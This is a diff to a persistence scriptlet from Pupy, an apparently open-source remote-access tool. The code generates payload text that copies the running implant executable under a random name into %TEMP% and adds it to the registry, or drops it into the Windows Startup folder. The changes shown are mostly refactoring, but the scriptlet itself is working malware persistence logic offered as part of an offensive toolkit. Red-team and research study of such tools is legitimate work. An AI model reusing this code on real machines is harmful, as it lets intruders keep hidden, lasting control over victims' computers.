@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 import textwrap, random, string
@@ -8,8 +8,11 @@ from scriptlets import *
 class ScriptletGenerator(Scriptlet):
     """ copy the current pupy executable to a random exe in %TEMP% and add persistency through registry """
 
-    dependencies=[("windows/all/pupwinutils/persistence.py","pupwinutils.persistence")]
-    arguments={
+    dependencies = {
+        'windows': [ 'pupwinutils.persistence' ]
+    }
+
+    arguments = {
         'method': 'available methods: registry, startup'
     }
 
@@ -18,7 +21,7 @@ class ScriptletGenerator(Scriptlet):
             raise ScriptletArgumentError("unknown persistence method %s"%method)
         self.method=method
 
-    def generate(self):
+    def generate(self, os):
         name=''.join(random.choice(string.ascii_lowercase) for _ in range(0,7))+".exe"
         if self.method=="registry":
             return textwrap.dedent("""
@@ -35,5 +38,3 @@ class ScriptletGenerator(Scriptlet):
             if sys.platform=="win32":
                 shutil.copy(sys.executable, os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{}"))
             """.format(name))
-
-
